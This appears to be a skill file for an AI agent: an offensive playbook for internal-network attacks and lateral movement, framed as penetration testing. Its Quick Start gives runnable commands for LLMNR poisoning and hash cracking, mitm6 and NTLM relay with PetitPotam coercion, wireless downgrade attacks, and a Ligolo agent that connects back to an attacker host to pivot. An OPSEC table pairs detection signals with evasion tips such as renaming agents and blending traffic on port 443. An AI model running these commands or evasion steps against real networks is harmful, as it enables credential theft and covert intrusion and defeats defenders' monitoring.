---
name: network-attack
description: Network protocol attacks & lateral movement — L2/L3 poisoning (LLMNR/mDNS, ARP/DHCP, IPv6 mitm6), coercion + NTLM relay (CVE-2025-33073 reflection), TUN-based pivoting (Ligolo-ng/Chisel), MitM/traffic interception, network-service RCE (CVE-2024-38077 MadLicense, CVE-2025-47981 NEGOEX), and WPA2/WPA3 wireless attacks
metadata:
  type: offensive
  phase: exploitation
  tools: responder, mitm6, impacket, ntlmrelayx, netexec, bettercap, ligolo-ng, chisel, scapy, hcxdumptool, eaphammer, hashcat, certipy
  mitre: TA0008
kill_chain:
  phase: [recon, exploit, actions]
  step: [1, 4, 7]
  attck_tactics: [TA0043, TA0008, TA0007, TA0006, TA0011]
  attck_techniques: [T1557, T1557.001, T1557.003, T1187, T1040, T1210, T1090, T1090.001, T1090.002, T1572, T1071.004, T1021.006, T1599, T1110, T1556]
depends_on: [recon-osint]
feeds_into: [active-directory-attack, privesc-linux, privesc-windows, advanced-redteam]
inputs: [network_map, service_list, foothold_position]
outputs: [lateral_movement_path, compromised_hosts, captured_hashes, relay_targets, pivot_routes]
references:
  - references/l2-attacks.md
  - references/coercion-relay-network.md
  - references/pivoting-tunneling.md
  - references/mitm-interception.md
  - references/protocol-rce.md
  - references/wireless-attacks.md
scripts:
  - scripts/responder_loot_parser.py
  - scripts/mitm6_relay_launcher.sh
  - scripts/vlan_hop.py
  - scripts/relay_target_finder.py
  - scripts/pivot_autoroute.sh
  - scripts/bettercap_mitm.sh
  - scripts/net_service_scan.py
  - scripts/wifi_attack.sh
---

# Network Attack & Lateral Movement

## When to Activate

- Internal network pentest from an unauthenticated wire position or initial foothold
- Layer-2/3 poisoning to capture credentials (LLMNR/NBT-NS/mDNS, ARP/DHCP, IPv6 mitm6)
- Coercion + NTLM relay from the network (signing/EPA mapping, CVE-2025-33073 reflection)
- Pivoting / tunneling across segments (Ligolo-ng, Chisel, SSH, DNS tunneling)
- Traffic interception / MitM (bettercap, RDP/SSH/STARTTLS downgrade, cookie theft)
- Network-service exploitation (SMB/RDP/RDL/NEGOEX RCE, MSSQL/WinRM/LDAP abuse)
- Wireless assessment (WPA2 capture/crack, WPA3-Transition downgrade, evil-twin 802.1X)
- For AD-specific relay targets (LDAP RBCD/shadow-creds, ADCS ESC8, Kerberos relay) and
  ticket/DCSync work, hand off to `active-directory-attack`.

## Technique Map

| Technique | ATT&CK | CWE | Reference | Script |
|-----------|--------|-----|-----------|--------|
| LLMNR/NBT-NS/mDNS poisoning (Responder) | T1557.001 | CWE-300 | references/l2-attacks.md | scripts/responder_loot_parser.py |
| ARP spoofing MitM | T1557.002 | CWE-300 | references/l2-attacks.md | scripts/bettercap_mitm.sh |
| DHCP starvation / rogue DHCP | T1557.003 | CWE-300 | references/l2-attacks.md | - |
| IPv6 takeover (mitm6 DHCPv6/DNS → relay) | T1557.001 | CWE-300 | references/l2-attacks.md | scripts/mitm6_relay_launcher.sh |
| STP root hijack / VLAN hopping (DTP, 802.1Q) | T1599 | CWE-284 | references/l2-attacks.md | scripts/vlan_hop.py |
| Coercion (PetitPotam/PrinterBug/DFSCoerce/WebDAV) | T1187 | CWE-294 | references/coercion-relay-network.md | scripts/relay_target_finder.py |
| NTLM relay (SMB/MSSQL/WinRM) | T1557.001 | CWE-294 | references/coercion-relay-network.md | scripts/relay_target_finder.py |
| NTLM reflection → SYSTEM (CVE-2025-33073) | T1187, T1557.001 | CWE-287 | references/coercion-relay-network.md | scripts/relay_target_finder.py |
| TUN pivoting (Ligolo-ng autoroute/multiplayer) | T1090.001 | CWE-923 | references/pivoting-tunneling.md | scripts/pivot_autoroute.sh |
| HTTP-SOCKS tunnel (Chisel) / SSH pivot | T1090.001, T1572 | CWE-923 | references/pivoting-tunneling.md | scripts/pivot_autoroute.sh |
| DNS tunneling (iodine/dnscat2) | T1071.004, T1572 | CWE-923 | references/pivoting-tunneling.md | - |
| Traffic interception / sslstrip / DNS spoof | T1557, T1040 | CWE-319 | references/mitm-interception.md | scripts/bettercap_mitm.sh |
| RDP/SSH/STARTTLS MitM & downgrade | T1557, T1185 | CWE-300 | references/mitm-interception.md | scripts/bettercap_mitm.sh |
| MadLicense RDL RCE (CVE-2024-38077) | T1210 | CWE-122 | references/protocol-rce.md | scripts/net_service_scan.py |
| NEGOEX wormable RCE (CVE-2025-47981) | T1210 | CWE-122 | references/protocol-rce.md | scripts/net_service_scan.py |
| RMCAST RCE (CVE-2025-21307) / RDS (CVE-2025-24035/45) | T1210 | CWE-787 | references/protocol-rce.md | scripts/net_service_scan.py |
| SMB EternalBlue (MS17-010) legacy | T1210 | CWE-119 | references/protocol-rce.md | scripts/net_service_scan.py |
| MSSQL xp_cmdshell / link crawl, WinRM, LDAP passback | T1210, T1021.006 | CWE-89 | references/protocol-rce.md | scripts/net_service_scan.py |
| WPA2 handshake/PMKID crack | T1110 | CWE-326 | references/wireless-attacks.md | scripts/wifi_attack.sh |
| WPA3-Transition downgrade (Dragonblood) | T1557 | CWE-757 | references/wireless-attacks.md | scripts/wifi_attack.sh |
| Evil-twin WPA-Enterprise (802.1X) cred capture | T1556 | CWE-295 | references/wireless-attacks.md | scripts/wifi_attack.sh |

## Quick Start

```bash
# 1. OWN THE SEGMENT — passive analyze, then poison + collect hashes
responder -I eth0 -A                                   # analyze (silent) first
responder -I eth0 -wd                                  # poison LLMNR/NBT-NS/mDNS+WPAD
python3 scripts/responder_loot_parser.py --logs /usr/share/responder/logs --outdir loot
hashcat -m 5600 loot/hashes_NTLMv2.txt rockyou.txt -r best64.rule

# 2. IPv6 path (often the fastest DA): mitm6 + relay to LDAPS -> RBCD
sudo bash scripts/mitm6_relay_launcher.sh corp.local eth0 ldaps-rbcd dc01.corp.local

# 3. MAP RELAY SURFACE, then coerce + relay (CVE-2025-33073 reflection candidates)
python3 scripts/relay_target_finder.py 10.0.0.0/24 -o relay_targets.txt --json surface.json
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks &
python3 PetitPotam.py -d corp.local -u user -p 'Pass' <RELAY_IP> <TARGET>

# 4. SCOPE SERVICE RCE SURFACE (MadLicense/NEGOEX/RDS/SMB)
python3 scripts/net_service_scan.py 10.0.0.0/24 --json services.json

# 5. PIVOT deeper (TUN, no proxychains)
bash scripts/pivot_autoroute.sh ligolo 0.0.0.0 11601
#   agent on target: ./agent -connect <ATTACKER>:11601 -ignore-cert -retry ; then 'autoroute'

# 6. WIRELESS entry (note PSK+SAE+MFP-off = WPA3 downgrade-vulnerable)
sudo bash scripts/wifi_attack.sh mon-up wlan0 && sudo bash scripts/wifi_attack.sh scan wlan0mon
sudo bash scripts/wifi_attack.sh wpa3dg wlan0 wlan1mon "CorpWiFi" 6
```

## OPSEC & Detection (summary)

| Technique | Telemetry / IOC | Detection (Sigma / EDR) | OPSEC note |
|-----------|-----------------|--------------------------|------------|
| LLMNR/NBT-NS/mDNS poison | one host answers many names; 4624/4625 type-3 burst to a workstation | Sigma name-resolution-poisoning; disable LLMNR/NBT-NS via GPO | `-A` is silent; full mode answers everything — scope tight |
| mitm6 IPv6 takeover | rogue DHCPv6 (UDP 547); endpoint IPv6 DNS change; 4741 computer add | Zeek rogue-DHCPv6 rule; RA-Guard/DHCPv6-Guard | very loud (whole VLAN); set MachineAccountQuota=0; delete created acct/RBCD |
| ARP/DNS spoof MitM | dup-MAC, gateway MAC change, rogue DNS answers | DAI, arpwatch, DNS-source allowlist | half-duplex cuts ARP volume; restore tables on exit; HSTS breaks sslstrip |
| Coercion + relay | EFSR/RPRN/DFSNM RPC; SMB→service from odd host | RPC Filter logs; signing:False target enumeration | coercion is "by-design"; needs signing/EPA off; SMB signing kills it |
| NTLM reflection (CVE-2025-33073) | 4624/4648 NTLM logon to self; new AD DNS A record + coercion | Sigma self-NTLM-logon; marshalled-DNS detect (Jun-2025 patch) | needs signing:False; delete crafted DNS record; patch+signing both fix |
| Ligolo/Chisel/SSH pivot | long-lived single TLS to ext IP; reverse listeners on pivot | NDR JA3/JA4 on Go TLS; beacon/`-retry`; binary on disk | run proxy on 443 to blend; rename agent; no admin needed on target |
| DNS tunneling | high-volume long random subdomains; high TXT/NULL ratio | NDR DNS-tunnel entropy/length analytics | throttle/jitter; A/CNAME over TXT; exfil small data only |
| Service RCE (MadLicense/NEGOEX/EternalBlue) | service crash/restart (SCM 7031); scanner fan-out 445/3389/1688 | crash telemetry; patch level; NSE smb-vuln | memory-corruption = DoS risk; never spray wormable; lab-validate, sign-off |
| WPA2/PMKID capture | deauth mgmt flood (handshake); PMKID passive | WIDS deauth alerts; 802.11w/MFP blocks deauth | prefer passive PMKID; short targeted deauth bursts |
| WPA3-Transition downgrade | 2nd BSSID for SSID; PSK+SAE+MFP-off advertised | WIPS rogue-AP; Transition-Disable bit | rogue AP beacons continuously — minimize on-air; WPA3-only+MFP defeats |
| Evil-twin 802.1X | rogue BSSID; RADIUS server-cert mismatch | WIPS; client server-cert validation | relies on supplicants not validating cert; EAP-TLS defeats |

## Deep Dives

- **references/l2-attacks.md** — LLMNR/NBT-NS/mDNS poisoning (Responder, WebDAV pivot, NTLMv1 downgrade), ARP/DHCP spoofing, IPv6 takeover (mitm6 + ntlmrelayx, 2025 resurgence), STP root hijack & VLAN hopping (DTP, 802.1Q double-tag).
- **references/coercion-relay-network.md** — Relay-surface mapping (SMB signing/EPA, RelayKing), coercion (PetitPotam/PrinterBug/DFSCoerce/WebDAV + RPC Filter), NTLM relay to SMB/MSSQL/WinRM, **CVE-2025-33073 NTLM reflection → SYSTEM**. Hands AD targets to `active-directory-attack`.
- **references/pivoting-tunneling.md** — Ligolo-ng (TUN/gVisor, autoroute, v0.8 multiplayer, double-pivot, ligolo-mp), Chisel HTTP-SOCKS, SSH `-D`/`-J`, DNS tunneling (iodine/dnscat2), proxychains chaining, tool-selection matrix.
- **references/mitm-interception.md** — bettercap inline MitM, sslstrip (HSTS limits), DNS spoof, RDP MitM (PyRDP/Seth, NLA), STARTTLS stripping, SSH TOFU MitM, cookie/session theft.
- **references/protocol-rce.md** — CVE-2024-38077 MadLicense (RDL), CVE-2025-47981 NEGOEX (wormable), CVE-2025-21307 RMCAST, CVE-2025-24035/45 RDS, MS17-010 EternalBlue, MSSQL xp_cmdshell/link crawl, WinRM, LDAP passback.
- **references/wireless-attacks.md** — WPA2 handshake/PMKID crack, WPA3-Transition downgrade (Dragonblood; DragonShift/eaphammer, 2024-2025 reproductions), evil-twin WPA-Enterprise MSCHAPv2 capture, hashcat workflows.
